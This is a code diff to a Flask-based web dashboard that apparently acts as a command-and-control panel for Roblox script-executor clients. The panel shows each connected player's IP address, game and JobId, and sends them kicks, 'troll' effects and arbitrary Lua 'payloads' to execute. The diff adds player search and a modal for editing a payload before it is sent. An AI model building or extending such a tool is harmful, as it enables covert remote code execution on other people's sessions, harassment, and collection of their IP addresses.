@@ -12,29 +12,23 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# === IPs autorisées ===
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
-
-# === Fichiers ===
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 
-# === Variables globales ===
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 history_log = []
-payloads = {}  # { "nom_payload": "code lua" }
+payloads = {}
 
-# === Chargement des données ===
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
         try:
             with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                 history_log = json.load(f)
-        except:
-            history_log = []
+        except: history_log = []
 
 def load_payloads():
     global payloads
@@ -42,20 +36,17 @@ def load_payloads():
         try:
             with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                 payloads = json.load(f)
-        except:
-            payloads = {}
+        except: payloads = {}
 
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
-    except:
-        pass
+    except: pass
 
 load_history()
 load_payloads()
 
-# === Sécurité IP ===
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -68,32 +59,23 @@ def access_denied(e):
     detected = request.headers.get("X-Forwarded-For", request.remote_addr)
     if detected and "," in detected:
         detected = detected.split(",")[0].strip()
-    return f"""
-    <html><body style="background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%;">
-      <h1>Accès refusé</h1>
-      <p>Ton IP : <b>{detected}</b></p>
-    </body></html>
-    """, 403
+    return f"<html><body style='background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%'><h1>Accès refusé</h1><p>Ton IP : <b>{detected}</b></p></body></html>", 403
 
 @app.before_request
 def protect_routes():
     if request.path in ["/", "/kick", "/troll", "/payload"] or request.path.startswith("/api"):
         check_ip()
 
-# === Historique ===
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
-    if len(history_log) > 100:
-        history_log.pop()
+    if len(history_log) > 100: history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
             json.dump(history_log, f, ensure_ascii=False, indent=2)
-    except:
-        pass
+    except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# === Page principale ===
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -116,6 +98,8 @@ HTML = """<!DOCTYPE html>
     .nav-item:hover{background:rgba(6,182,212,.15);color:var(--primary);}
     .nav-item.active{background:rgba(6,182,212,.25);color:var(--primary);border-left:4px solid var(--primary);}
     .content{flex:1;padding:2rem;overflow-y:auto;}
+    .search-bar{margin-bottom:20px;}
+    .search-bar input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;font-size:1rem;}
     .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem;}
     .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all .4s;position:relative;overflow:hidden;}
     .card:hover{transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,.25);border-color:var(--primary);}
@@ -137,7 +121,7 @@ HTML = """<!DOCTYPE html>
     .btn.undo{background:#475569;}
     .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
     .modal.active{display:flex;}
-    .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:560px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
+    .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:600px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
     .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem;}
     input,textarea,select{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
     .modal-buttons{display:flex;gap:1rem;}
@@ -169,7 +153,10 @@ HTML = """<!DOCTYPE html>
     </div>
 
     <div class="content">
-        <div id="players-tab" class="tab active"><div class="grid" id="players"></div></div>
+        <div id="players-tab" class="tab active">
+            <div class="search-bar"><input type="text" id="searchInput" placeholder="Search by username, ID, IP, Game, JobId..." onkeyup="filterPlayers()"></div>
+            <div class="grid" id="players"></div>
+        </div>
         <div id="workshop-tab" class="tab" style="display:none;">
             <button class="btn" style="margin-bottom:20px;" id="newPayloadBtn">+ New Payload</button>
             <div id="payloads-list"></div>
@@ -178,14 +165,23 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- Modals -->
+<!-- Tous les modals -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
 <div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
-<div class="modal" id="selectPayloadModal"><div class="modal-content"><h2>Select Payload to Execute</h2><select id="payloadSelect" size="10" style="height:300px;"></select><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="executeSelectedPayload">Execute Selected</button></div></div></div>
+
+<!-- Nouveau modal : exécuter payload avec édition temporaire -->
+<div class="modal" id="executePayloadModal"><div class="modal-content">
+    <h2>Execute Payload (edit before send)</h2>
+    <textarea id="tempPayloadCode" style="height:300px;"></textarea>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel">Cancel</button>
+        <button class="modal-btn confirm" id="executeTempPayload">Execute Modified</button>
+    </div>
+</div></div>
 
 <div class="toast-container" id="toasts"></div>
 
@@ -193,6 +189,7 @@ HTML = """<!DOCTYPE html>
 const socket = io();
 let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
 let editingPayload = null;
+let tempPayloadCode = "";
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
@@ -206,11 +203,18 @@ document.querySelectorAll('.nav-item').forEach(item => {
 });
 
 function toast(msg) {
-    const t = document.createElement("div");
-    t.className = "toast";
-    t.textContent = msg;
+    const t = document.createElement("div"); t.className = "toast"; t.textContent = msg;
     document.getElementById("toasts").appendChild(t);
     setTimeout(() => t.remove(), 4000);
+}
+
+// Recherche joueurs
+function filterPlayers() {
+    const query = document.getElementById("searchInput").value.toLowerCase();
+    document.querySelectorAll('.card').forEach(card => {
+        const text = card.textContent.toLowerCase();
+        card.style.display = text.includes(query) ? "block" : "none";
+    });
 }
 
 // Workshop
@@ -267,26 +271,44 @@ document.getElementById("savePayload").addEventListener("click", () => {
     });
 });
 
+// Ouvrir payload avec édition temporaire
 window.openPayloadSelector = function(id) {
     currentLuaId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
-        const sel = document.getElementById("payloadSelect");
-        sel.innerHTML = "";
-        if (Object.keys(data).length === 0) sel.innerHTML = "<option>No payload</option>";
-        else for (const n of Object.keys(data)) {
-            const opt = document.createElement("option"); opt.value = n; opt.textContent = n; sel.appendChild(opt);
+        if (Object.keys(data).length === 0) {
+            toast("No payload available");
+            return;
         }
-        document.getElementById("selectPayloadModal").classList.add("active");
+        const select = document.createElement("select");
+        select.innerHTML = "<option value=''>-- Select a payload --</option>";
+        for (const name of Object.keys(data)) {
+            const opt = document.createElement("option");
+            opt.value = name; opt.textContent = name; select.appendChild(opt);
+        }
+        select.onchange = () => {
+            if (select.value) {
+                fetch("/payload?action=get&name=" + encodeURIComponent(select.value)).then(r => r.json()).then(d => {
+                    document.getElementById("tempPayloadCode").value = d.code;
+                    document.getElementById("executePayloadModal").classList.add("active");
+                });
+            }
+        };
+        toast("Select a payload → it will open for editing");
+        // On ouvre directement le modal avec le sélecteur
+        const modal = document.getElementById("executePayloadModal");
+        modal.querySelector(".modal-content").innerHTML = `<h2>Select & Edit Payload</h2>${select.outerHTML}<textarea id="tempPayloadCode" style="height:300px;margin-top:1rem;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="executeTempPayload">Execute Modified</button></div>`;
+        modal.classList.add("active");
     });
 };
 
-document.getElementById("executeSelectedPayload").addEventListener("click", () => {
-    const name = document.getElementById("payloadSelect").value;
-    if (!name) return;
-    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
-        sendTroll(currentLuaId, "luaexec", d.code);
-        document.getElementById("selectPayloadModal").classList.remove("active");
-    });
+document.addEventListener("click", e => {
+    if (e.target && e.target.id === "executeTempPayload") {
+        const code = document.getElementById("tempPayloadCode").value.trim();
+        if (code && currentLuaId) {
+            sendTroll(currentLuaId, "luaexec", code);
+            document.getElementById("executePayloadModal").classList.remove("active");
+        }
+    }
 });
 
 // Fonctions classiques
@@ -305,6 +327,7 @@ function sendTroll(id,cmd,param=null){
     toast(cmd.toUpperCase()+" sent");
 }
 
+// Confirmations classiques
 document.getElementById("confirmKick").addEventListener("click",()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent");document.getElementById("kickModal").classList.remove("active");});
 document.getElementById("confirmSound").addEventListener("click",()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);document.getElementById("playSoundModal").classList.remove("active");});
 document.getElementById("confirmText").addEventListener("click",()=>{const t=document.getElementById("screenText").value.trim();if(t)sendTroll(currentTextId,"textscreen",t);document.getElementById("textScreenModal").classList.remove("active");});
@@ -327,7 +350,7 @@ function render(data){
         card.innerHTML=`
             <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a></div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId}</div>
 
             <div class="category">TROLLS</div>
             <div class="btn-grid">
@@ -375,6 +398,7 @@ fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </body>
 </html>"""
 
+# === Toutes les routes (inchangées) ===
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -461,8 +485,7 @@ def payload_manager():
     check_ip()
     if request.method == "GET":
         action = request.args.get("action")
-        if action == "list":
-            return jsonify(payloads)
+        if action == "list": return jsonify(payloads)
         if action == "get":
             name = request.args.get("name")
             return jsonify({"code": payloads.get(name, "")})
